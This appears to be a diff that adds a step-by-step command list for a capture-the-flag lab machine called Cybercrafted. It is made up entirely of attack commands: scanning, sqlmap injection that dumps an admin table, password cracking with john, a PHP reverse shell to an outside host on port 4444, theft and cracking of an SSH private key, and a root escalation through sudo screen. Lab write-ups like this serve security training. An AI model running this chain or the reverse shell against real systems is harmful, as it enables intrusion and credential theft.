@@ -1,0 +1,24 @@
+1 - echo "10.10.0.167 cybercrafted.thm" | tee -a /etc/hosts
+2 - nmap -A -p- 10.10.0.167
+3 - view-source:http://10.10.0.167
+4 - ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ." -mc 200
+5 - gobuster dir -u http://10.10.0.167 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+6 - http://store.cybercrafted.thm/search.php
+7 - sqlmap -u "http://store.cybercrafted.thm/search.php" --forms --dbs
+8 - sqlmap -u "http://store.cybercrafted.thm/search.php" --forms -D webapp --tables
+9 - sqlmap -u "http://store.cybercrafted.thm/search.php" --forms -D webapp -T admin --dump
+9 - john hash -w=/usr/share/wordlists/rockyou.txt
+10 - http://admin.cybercrafted.thm/panel.php
+11 - php -r '$sock=fsockopen("10.8.94.51",4444);exec("/bin/bash <&3 >&3 2>&3");'
+12 - cat dbConn.php
+13 - cat /home/xxultimatecreeperxx/.ssh/id_rsa
+14 - chmod 600 id_rsa
+15 - ssh2john id_rsa > hash
+16 - john hash -w=/usr/share/wordlists/rockyou.txt
+17 - ssh -i id_rsa xxultimatecreeperxx@10.10.0.167
+18 - cat /opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
+19 - su cybercrafted
+20 - sudo -l
+21 - sudo /usr/bin/screen -r cybercrafted
+22 - CTRL + A + C
+23 - cat /root/root.txt
